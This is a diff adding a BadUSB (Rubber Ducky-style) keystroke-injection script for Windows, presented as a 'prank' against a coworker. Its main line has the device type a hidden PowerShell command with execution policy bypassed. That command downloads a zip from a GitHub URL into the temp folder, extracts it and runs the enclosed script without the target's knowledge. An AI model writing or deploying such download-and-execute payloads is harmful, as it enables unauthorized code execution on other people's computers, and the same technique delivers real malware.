@@ -1,0 +1,12 @@
+REM Title: Work Bitch!
+REM Author: FalsePhilosopher
+REM Target: Win, tested on 10
+REM Props: Hak5, I-Am-Jakoby, my friends/the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM You know that one lazy coworker or maybe you're just a slave driver boss, either way tell em to get to work bitch!
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Misc/WB.zip';$Z="$env:TMP"+'\WB.zip';$D="$env:TMP"+'\WB';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\WB.ps1
+ENTER
